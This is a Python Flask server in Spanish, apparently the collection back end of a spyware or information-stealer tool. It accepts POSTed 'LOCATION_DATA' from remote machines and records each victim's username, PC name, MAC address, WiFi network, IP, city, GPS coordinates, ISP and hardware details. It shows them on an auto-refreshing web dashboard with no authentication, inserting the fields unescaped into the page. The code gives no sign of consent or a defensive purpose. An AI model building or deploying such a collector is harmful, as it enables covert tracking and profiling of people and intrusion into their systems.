from flask import Flask, request, jsonify
import json
from datetime import datetime
import os

app = Flask(__name__)

# Almacenamiento en memoria (para GitHub Pages)
datos_recibidos = []

def handle_data(data, client_ip):
    try:
        if data.startswith("LOCATION_DATA:"):
            json_data = data.split(":", 1)[1]
            location = json.loads(json_data)
            
            if location.get('status') == 'success':
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                # Formatear datos para mostrar
                datos_formateados = {
                    'timestamp': timestamp,
                    'client_ip': client_ip,
                    'conexion': {
                        'desde': client_ip,
                        'gateway': f"{location.get('gateway', 'Unknown')} ({location.get('gateway_name', 'Unknown')})",
                        'wifi': location.get('wifi_ssid', 'Unknown'),
                        'tipo': location.get('connection_type', 'Unknown'),
                        'adaptador': location.get('adapter_name', 'Unknown'),
                        'mac': location.get('mac_address', 'Unknown'),
                        'dns': location.get('dns', 'Unknown')
                    },
                    'usuario_sistema': {
                        'usuario': location.get('user_name', 'Unknown'),
                        'pc': location.get('computer_name', 'Unknown'),
                        'so': location.get('os', 'Unknown')
                    },
                    'geografica': {
                        'ip': location.get('ip', 'Unknown'),
                        'ciudad': location.get('city', 'Unknown'),
                        'pais': location.get('country', 'Unknown'),
                        'coordenadas': f"{location.get('latitude', 0)}, {location.get('longitude', 0)}",
                        'isp': location.get('isp', 'Unknown')
                    },
                    'hardware': {
                        'cpu': location.get('cpu', 'Unknown'),
                        'gpu': location.get('gpu', 'Unknown'),
                        'ram': f"{location.get('ram_gb', 0)} GB",
                        'disco': f"{location.get('disk_gb', 0)} GB (Libre: {location.get('disk_free_gb', 0)} GB)",
                        'placa': location.get('motherboard', 'Unknown'),
                        'fabricante': location.get('manufacturer', 'Unknown')
                    }
                }
                
                # Agregar a la lista
                datos_recibidos.append(datos_formateados)
                
                # Mostrar en consola
                print("\n" + "="*50)
                print(f"DATOS RECIBIDOS - {timestamp}")
                print("="*50)
                print(f"Desde: {client_ip}")
                print(f"Usuario: {location.get('user_name', 'Unknown')}")
                print(f"PC: {location.get('computer_name', 'Unknown')}")
                print(f"IP: {location.get('ip', 'Unknown')}")
                print(f"Ciudad: {location.get('city', 'Unknown')}")
                print("="*50)
                
                return datos_formateados
    except Exception as e:
        print(f"Error procesando datos: {e}")
        return None

@app.route('/')
def index():
    return '''
<!DOCTYPE html>
<html>
<head>
    <title>Servidor de Ubicación</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #333; color: white; padding: 20px; text-align: center; }
        .datos { background: white; margin: 20px 0; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .seccion { margin: 15px 0; padding: 15px; border-left: 4px solid #007bff; background: #f8f9fa; }
        .seccion h3 { color: #007bff; margin-top: 0; }
        .dato { margin: 8px 0; }
        .dato strong { color: #333; }
        .timestamp { color: #666; font-size: 12px; }
        .no-datos { text-align: center; color: #666; padding: 40px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌍 Servidor de Ubicación en GitHub</h1>
            <p>Servidor funcionando correctamente - Esperando datos...</p>
        </div>
        <div id="datos-container">
            <div class="no-datos">No hay datos recibidos aún. Los datos aparecerán aquí automáticamente.</div>
        </div>
    </div>
    
    <script>
        // Simular datos para demostración
        function actualizarDatos() {
            fetch('/api/datos')
                .then(response => response.json())
                .then(datos => {
                    const container = document.getElementById('datos-container');
                    if (datos.length === 0) {
                        container.innerHTML = '<div class="no-datos">No hay datos recibidos aún.</div>';
                        return;
                    }
                    
                    let html = '';
                    datos.reverse().forEach(dato => {
                        html += `
                            <div class="datos">
                                <div class="timestamp">${dato.timestamp} - ${dato.client_ip}</div>
                                
                                <div class="seccion">
                                    <h3>📡 Información de Conexión</h3>
                                    <div class="dato"><strong>Desde:</strong> ${dato.conexion.desde}</div>
                                    <div class="dato"><strong>Gateway:</strong> ${dato.conexion.gateway}</div>
                                    <div class="dato"><strong>Red WiFi:</strong> ${dato.conexion.wifi}</div>
                                    <div class="dato"><strong>Tipo:</strong> ${dato.conexion.tipo}</div>
                                    <div class="dato"><strong>Adaptador:</strong> ${dato.conexion.adaptador}</div>
                                    <div class="dato"><strong>MAC:</strong> ${dato.conexion.mac}</div>
                                    <div class="dato"><strong>DNS:</strong> ${dato.conexion.dns}</div>
                                </div>
                                
                                <div class="seccion">
                                    <h3>👤 Usuario y Sistema</h3>
                                    <div class="dato"><strong>Usuario:</strong> ${dato.usuario_sistema.usuario}</div>
                                    <div class="dato"><strong>PC:</strong> ${dato.usuario_sistema.pc}</div>
                                    <div class="dato"><strong>SO:</strong> ${dato.usuario_sistema.so}</div>
                                </div>
                                
                                <div class="seccion">
                                    <h3>🌍 Información Geográfica</h3>
                                    <div class="dato"><strong>IP:</strong> ${dato.geografica.ip}</div>
                                    <div class="dato"><strong>Ciudad:</strong> ${dato.geografica.ciudad}</div>
                                    <div class="dato"><strong>País:</strong> ${dato.geografica.pais}</div>
                                    <div class="dato"><strong>Coordenadas:</strong> ${dato.geografica.coordenadas}</div>
                                    <div class="dato"><strong>ISP:</strong> ${dato.geografica.isp}</div>
                                </div>
                                
                                <div class="seccion">
                                    <h3>💻 Información del Hardware</h3>
                                    <div class="dato"><strong>CPU:</strong> ${dato.hardware.cpu}</div>
                                    <div class="dato"><strong>GPU:</strong> ${dato.hardware.gpu}</div>
                                    <div class="dato"><strong>RAM:</strong> ${dato.hardware.ram}</div>
                                    <div class="dato"><strong>Disco:</strong> ${dato.hardware.disco}</div>
                                    <div class="dato"><strong>Placa Base:</strong> ${dato.hardware.placa}</div>
                                    <div class="dato"><strong>Fabricante:</strong> ${dato.hardware.fabricante}</div>
                                </div>
                            </div>
                        `;
                    });
                    container.innerHTML = html;
                })
                .catch(error => console.error('Error:', error));
        }
        
        // Actualizar cada 5 segundos
        actualizarDatos();
        setInterval(actualizarDatos, 5000);
    </script>
</body>
</html>
    '''

@app.route('/api/datos', methods=['GET'])
def get_datos():
    return jsonify(datos_recibidos)

@app.route('/', methods=['POST'])
def receive_data():
    data = request.data.decode('utf-8')
    client_ip = request.remote_addr
    resultado = handle_data(data, client_ip)
    if resultado:
        return jsonify({"status": "success", "message": "Datos recibidos correctamente"}), 200
    else:
        return jsonify({"status": "error", "message": "Error procesando datos"}), 400

if __name__ == "__main__":
    print("🚀 SERVIDOR DE UBICACION EN GITHUB")
    print("=" * 50)
    print("✅ Servidor iniciado en puerto 5000")
    print("🌐 Acceso web: http://localhost:5000")
    print("📡 API Endpoint: http://localhost:5000/")
    print("⏳ Esperando conexiones...")
    print("=" * 50)
    app.run(host='0.0.0.0', port=5000, debug=False)
